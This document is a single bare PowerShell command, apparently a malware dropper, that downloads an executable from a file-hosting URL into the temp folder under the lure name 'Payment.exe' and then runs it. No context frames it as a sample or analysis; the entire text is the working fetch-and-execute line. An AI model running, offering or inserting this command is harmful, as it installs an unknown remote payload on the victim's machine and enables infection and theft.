
(New-Object System.Net.WebClient).DownloadFile('https://a.pomf.cat/tpaesb.exe',"$env:TEMP\Payment.exe");Start-Process ("$env:TEMP\Payment.exe")

